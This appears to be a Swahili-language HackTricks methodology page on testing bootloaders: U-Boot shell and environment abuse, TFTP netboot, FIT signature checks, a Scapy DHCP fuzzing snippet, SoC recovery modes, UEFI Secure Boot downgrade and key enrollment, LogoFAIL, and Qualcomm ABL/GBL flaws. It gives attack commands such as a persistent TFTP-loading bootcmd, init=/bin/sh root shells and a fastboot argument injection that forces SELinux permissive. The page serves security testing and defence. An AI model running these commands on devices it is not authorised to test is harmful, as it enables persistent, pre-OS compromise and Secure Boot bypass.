# Kujaribu Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kurekebisha usanidi wa kuwasha kifaa na kujaribu bootloader kama vile U-Boot na loader za darasa la UEFI. Lenga kupata utekelezaji wa msimbo mapema, kutathmini ulinzi wa sahihi/rollback na kutumia vibaya njia za urejeshaji au kuwasha kupitia mtandao.

Inahusiana: Kukwepa secure-boot ya MediaTek kupitia patching ya bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Ufanisi wa haraka wa U-Boot na matumizi mabaya ya mazingira

1. Fikia shell ya interpreter
   - Wakati wa kuwasha, bonyeza kitufe kinachojulikana cha kusitisha (mara nyingi kitufe chochote, 0, space, au mfuatano maalum wa kitufe wa bodi husika) kabla ya `bootcmd` kutekelezwa ili kufikia prompt ya U-Boot.<sup>[[1]](#references)</sup>

2. Kagua hali ya kuwasha na vigezo
   - Amri muhimu:
     - `printenv` (onyesha mazingira)
     - `bdinfo` (maelezo ya bodi, anwani za kumbukumbu)
     - `help bootm; help booti; help bootz` (mbinu za kuwasha kernel zinazotumika)
     - `help ext4load; help fatload; help tftpboot` (loader zinazopatikana)

3. Rekebisha hoja za kuwasha ili kupata root shell
   - Ongeza `init=/bin/sh` ili kernel ifungue shell badala ya init ya kawaida:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot kutoka kwenye seva yako ya TFTP
   - Sanidi mtandao na upakue picha ya kernel/fit kutoka LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Hifadhi mabadiliko kupitia environment
   - Ikiwa hifadhi ya env haijalindwa dhidi ya uandishi, unaweza kuhifadhi udhibiti:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Kagua vigezo kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` vinavyoathiri njia za kurejea. Thamani zilizosanidiwa vibaya zinaweza kuruhusu kuvunja mfumo na kuingia kwenye shell mara kwa mara.

6. Kagua vipengele vya debug/isivyo salama
   - Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` bila vizuizi, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka kwenye media isiyoaminika, na kernels/ramdisks zinazopakiwa bila ukaguzi wa saini.

7. Jaribio la picha/uthibitishaji wa U-Boot
   - Ikiwa jukwaa linadai kuwa na secure/verified boot inayotumia picha za FIT, jaribu picha zisizosainiwa na zilizobadilishwa:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Kukosekana kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu kuwasha payload yoyote.
   - Usiishie kwenye matokeo rahisi ya ruhusa/katazo: utafiti wa hivi majuzi kuhusu FIT ulionyesha kuwa njia ya verification yenyewe inaweza kuwa sehemu ya mashambulizi kabla ya uthibitishaji. Fanya majaribio hasi kwenye data ya FIT iliyohifadhiwa nje (`data-offset`, `data-position`, `data-size`), uteuzi wa configuration iliyosainiwa, `loadables`, na ushughulikiaji wa overlay / `extra-conf`.
   - Ikiwa una source tree inayolingana, `test/vboot/vboot_test.sh` ni njia ya haraka ya kuiga tabia ya FIT verification kwenye U-Boot sandbox kabla ya kugusa hardware halisi.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, na bootflows za script
   - Katika builds za kisasa za U-Boot, `bootcmd` mara nyingi ni wrapper tu ya Standard Boot. Hiyo inamaanisha media inayoweza kuandikwa, PXE, au SPI flash inaweza kuwa mpaka halisi wa uaminifu, hata wakati environment inayoonekana haina madhara.
   - `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza, kisha `boot.scr`. Kwenye network boot, jina la script linaweza kutoka kwa `boot_script_dhcp`.
   - Amri muhimu za triage:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Matukio ya matumizi mabaya ya kujaribu: media ya USB/SD inayodhibitiwa na mshambulizi iliyo mapema zaidi kwenye `boot_targets`, `/boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP hasidi inayotoa `boot.scr`, au utekelezaji wa script kupitia SPI kwa kutumia `script_offset_f`.
   - Ikiwa mfumo unategemea uthibitishaji wa FIT, hakikisha usanidi umesainiwa katika kiwango cha configuration, si kwa kila image pekee; `required-mode=all` ina nguvu zaidi kuliko kukubali key yoyote moja inayohitajika.

## Sehemu ya mashambulizi ya boot kupitia mtandao (DHCP/PXE) na seva hasidi

9. Fuzzing ya vigezo vya PXE/DHCP
   - Ushughulikiaji wa zamani wa BOOTP/DHCP wa U-Boot umewahi kuwa na matatizo ya usalama wa kumbukumbu. Kwa mfano, CVE‑2024‑42040 inaeleza ufichuaji wa kumbukumbu kupitia majibu ya DHCP yaliyoundwa mahsusi, yanayoweza kusababisha bytes kutoka kwenye kumbukumbu ya U-Boot kuvuja kupitia mtandao.<sup>[[4]](#references)</sup> Jaribu njia za msimbo wa DHCP/PXE kwa kutumia thamani ndefu kupita kiasi au za hali za ukingoni (option 67 bootfile-name, vendor options, sehemu za file/servername) na uchunguze kama kuna hang/leak.
   - Kipande kifupi cha Scapy cha kusisitiza vigezo vya boot wakati wa netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Pia thibitisha ikiwa sehemu za jina la faili za PXE hupitishwa kwa mantiki ya shell/loader bila kusafishwa, zinapounganishwa na hati za provisioning za upande wa OS.

10. Jaribio la command injection kupitia seva ya DHCP hasidi
   - Sanidi huduma hasidi ya DHCP/PXE na ujaribu kuingiza herufi kwenye sehemu za jina la faili au chaguo ili kufikia vichakataji vya amri katika hatua za baadaye za mnyororo wa kuwasha. Zana za Metasploit za DHCP auxiliary, `dnsmasq`, au hati maalum za Scapy zinafaa. Hakikisha umetenga mtandao wa maabara kwanza.

## Hali za urejeshaji wa SoC ROM zinazobatilisha uanzishaji wa kawaida

SoC nyingi hutoa hali ya "loader" ya BootROM inayokubali msimbo kupitia USB/UART hata wakati picha za flash si sahihi. Ikiwa fuse za secure-boot hazijachomwa, hii inaweza kuwezesha utekelezaji wa msimbo wowote mapema sana kwenye mnyororo.

- NXP i.MX (Serial Download Mode)
  - Zana: `uuu` (mfgtools3) au `imx-usb-loader`.
  - Mfano: `imx-usb-loader u-boot.imx` ili kutuma na kuendesha U-Boot maalum kutoka RAM.
- Allwinner (FEL)
  - Zana: `sunxi-fel`.
  - Mfano: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Zana: `rkdeveloptool`.
  - Mfano: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` ili kuweka loader kwa muda na kupakia U-Boot maalum.

Tathmini ikiwa eFuses/OTP za secure-boot za kifaa zimechomwa. Ikiwa hazijachomwa, hali za upakuaji za BootROM mara nyingi hupita uthibitishaji wowote wa ngazi za juu (U-Boot, kernel, rootfs) kwa kutekeleza payload yako ya hatua ya kwanza moja kwa moja kutoka SRAM/DRAM.

## Bootloader za UEFI/PC: ukaguzi wa haraka

11. Jaribio la kuchezewa kwa ESP, kurudishwa kwenye toleo la zamani, na usajili wa funguo
   - Mount kizigeu cha EFI System (ESP) na uangalie vipengele vya loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, njia za nembo za mtengenezaji.
   - Tupa hali ya Secure Boot na hifadhidata za funguo kutoka kwenye OS inapowezekana:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Ikiwa jukwaa liko katika Setup Mode, linakubali kusajili funguo bila uthibitishaji, au linakuja na Platform Key ya majaribio/chaguomsingi (darasa la PKfail), admin wa ndani au mshambuliaji wa kimwili anaweza kusajili KEK/db yake na kuifanya Secure Boot ionekane “imewashwa” huku akiwasha EFI binaries zozote.<sup>[[3]](#references)</sup>
   - Jaribu kuwasha kwa kutumia vipengele vya boot vilivyotiwa saini vilivyoshushwa toleo au vinavyojulikana kuwa na udhaifu ikiwa orodha ya revocations ya Secure Boot (dbx) haijasasishwa. Ikiwa jukwaa bado linaamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako mwenyewe au `grub.cfg` kutoka ESP ili kupata persistence.
   - Kwenye Windows, mifumo iliyowekewa patches bado inaweza kukubali boot managers zilizosainiwa zilizo na udhaifu ikiwa msaini wa `Microsoft Windows Production PCA 2011` bado hayupo kwenye firmware `dbx`, kama ilivyoonekana kwa BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Bypass ya aina ya Baton Drop inaweza kusajili MOK ya mshambuliaji; kisha shim halali inaweza kupakia EFI payload iliyosainiwa na ufunguo huo wakati wa kuwasha kwa baadaye.<sup>[[12]](#references)[[13]](#references)</sup> Kuondoa baadaye msaini wa zamani wa Windows hakufuti MOK iliyosajiliwa, kwa hivyo njia inayotegemea shim inaweza kuendelea kufanya kazi ikiwa shim hiyo bado inaaminika.<sup>[[12]](#references)</sup>
   - Kabla ya kujaribu njia hii ya kurudisha toleo kwenye mashine ya UEFI iliyoidhinishwa, angalia **hali halisi ya revocation ya firmware**, si historia ya masasisho ya Windows pekee.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft inatoa ukaguzi huu wa PowerShell wa kusoma pekee unaohitaji ruhusa za juu kwa msaini wa 2011 katika `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` ni kidokezo tu: thibitisha kipengele mahususi cha boot kilichotiwa saini na revocation nyingine katika maabara inayoweza kurejeshwa.<sup>[[12]](#references)[[14]](#references)</sup> Sasisho la registry linalosubiri kutumika au cheti cha kusaini kilichoisha muda wake si sawa na revocation ya `dbx` iliyokamilishwa.<sup>[[13]](#references)[[14]](#references)</sup>

12. Jaribio la shim / SBAT / dbx revocation iliyopitwa na wakati
   - Shim za zamani zilizotiwa saini na Microsoft na fork za vendor bado zinaweza kutumika kama njia ya bootkit ya aina ya BYOVD ikiwa revocation zimepitwa na wakati. Katika maabara iliyotengwa, weka shim iliyokuwa hatarini kihistoria kwenye ESP na ujaribu ku-chainload `grubx64.efi` au kernel yako mwenyewe.<sup>[[11]](#references)</sup>
   - Tathmini ya haraka:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Ikiwa shim bado inaendeshwa licha ya kuwa kwenye orodha ya revocation, firmware/OS ina masasisho ya `dbx` yaliyopitwa na wakati au inaamini loader forked ambayo haikuwahi kurithi ulinzi wa SBAT wa upstream.

13. Hitilafu za uchanganuzi wa nembo ya boot (darasa la LogoFAIL)
   - Firmware kadhaa za OEM/IBV zilikuwa na udhaifu wa hitilafu za uchanganuzi wa picha katika DXE zinazochakata nembo za boot. Ikiwa mshambulizi anaweza kuweka picha iliyoundwa kwa makusudi kwenye ESP chini ya njia mahususi ya vendor (k.m., `\EFI\<vendor>\logo\*.bmp`) na kuwasha upya, huenda utekelezaji wa code ukawezekana wakati wa boot ya mapema hata Secure Boot ikiwa imewashwa. Jaribu ikiwa mfumo unakubali nembo zinazotolewa na mtumiaji na ikiwa njia hizo zinaweza kuandikiwa kutoka kwenye OS.<sup>[[2]](#references)</sup>


## Mapengo ya uaminifu ya Android/Qualcomm ABL + GBL (Android 16)

Kwenye vifaa vya Android 16 vinavyotumia ABL ya Qualcomm kupakia **Generic Bootloader Library (GBL)**, thibitisha ikiwa ABL **huthibitisha uhalisi** wa programu ya UEFI inayopakia kutoka kwenye partition ya `efisp`. Ikiwa ABL hukagua tu **uwepo** wa programu ya UEFI na haithibitishi sahihi, primitive ya kuandika kwenye `efisp` huwa **utekelezaji wa code isiyosainiwa kabla ya OS** wakati wa boot.<sup>[[6]](#references)[[7]](#references)</sup>

Ukaguzi wa vitendo na njia za matumizi mabaya:

- **primitive ya kuandika kwenye efisp**: Unahitaji njia ya kuandika programu maalum ya UEFI kwenye `efisp` (root/huduma yenye haki za juu, hitilafu katika programu ya OEM, njia ya recovery/fastboot). Bila hili, pengo la upakiaji wa GBL haliwezi kufikiwa moja kwa moja.<sup>[[6]](#references)</sup>
- **uingizaji wa argument ya fastboot OEM** (hitilafu ya ABL): Baadhi ya builds hukubali tokeni za ziada katika `fastboot oem set-gpu-preemption` na kuziongeza kwenye cmdline ya kernel. Hili linaweza kutumiwa kulazimisha SELinux iwe permissive, na hivyo kuruhusu uandishi kwenye partition zilizolindwa:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Ikiwa kifaa kimewekewa kiraka, amri inapaswa kukataa hoja za ziada.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock kupitia flags zinazoendelea**: Payload ya hatua ya boot inaweza kubadilisha flags za unlock zinazoendelea (kwa mfano, `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila vizuizi vya seva/idhini ya OEM. Hali hii hudumu baada ya kuwasha upya.<sup>[[6]](#references)</sup>

Maelezo ya kujilinda/triage:

- Thibitisha kama ABL hufanya signature verification ya payload ya GBL/UEFI kutoka `efisp`. Ikiwa haifanyi hivyo, ichukulie `efisp` kuwa eneo la persistence lenye hatari kubwa.
- Fuatilia kama handlers za fastboot OEM za ABL zimewekewa kiraka ili **kuthibitisha idadi ya hoja** na kukataa tokeni za ziada.<sup>[[8]](#references)[[9]](#references)</sup>

## Tahadhari ya maunzi

Kuwa mwangalifu unaposhughulikia SPI/NAND flash wakati wa boot ya awali (kwa mfano, kuweka pini ardhini ili kukwepa usomaji) na kila mara soma datasheet ya flash. Kuunganisha pini kwa muda usiofaa kunaweza kuharibu kifaa au programmer.

## Maelezo na vidokezo vya ziada

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` ili kuhamisha blobs za mazingira kati ya RAM na hifadhi; baadhi ya majukwaa huruhusu kuingiza env kutoka kwenye media inayoweza kutolewa bila uthibitishaji.
- Kwa persistence kwenye mifumo inayotegemea Linux na kuwasha kupitia `extlinux.conf`, kurekebisha mstari wa `APPEND` (kuingiza `init=/bin/sh` au `rd.break`) kwenye boot partition mara nyingi hutosha ikiwa hakuna ukaguzi wa saini unaotekelezwa.
- Ikiwa lengwa linatumia masasisho ya dual-slot / A/B, kagua mbinu za anti-rollback na slot-desync katika [muhtasari wa uchanganuzi wa firmware](README.md) ili usikose mapengo ya uaminifu yanayotokea tu kwenye updater, nje ya bootloader yenyewe.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na hifadhi halisi ya env. Offsets zilizosanidiwa vibaya zinaweza kukuruhusu kusoma/kuandika eneo lisilo sahihi la MTD.

## References

- [1] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Kugundua LogoFAIL: Hatari za kuchanganua picha wakati wa kuwasha mfumo](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Funguo za Jukwaa Zisizoaminika Zinadhoofisha Secure Boot katika Mfumo Ikolojia wa UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Maelezo ya CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Ilizuiliwa: Kufungua Xiaomi kupitia mifuatano miwili isiyosafishwa](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit ya Qualcomm Snapdragon 8 Elite GBL inawawezesha washambuliaji kufungua bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Muundo wa Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Rekebisha uenezaji wa ingizo lisiloaminika hadi kwenye kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Ongeza ukaguzi kwa amri ya set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Haifai kuwasha: Kuvunja uthibitishaji wa saini ya FIT ya U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Notisi ya Athari VU#616257 - Shim bootloaders za UEFI zilizosainiwa na Microsoft ziko hatarini kwa Secure Boot bypass](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit ya BlackLotus: Dhana imethibitishwa](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit inayofanana na BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Jinsi ya kudhibiti ubatilishaji wa Windows Boot Manager kwa mabadiliko ya Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
{{#include ../../banners/hacktricks-training.md}}
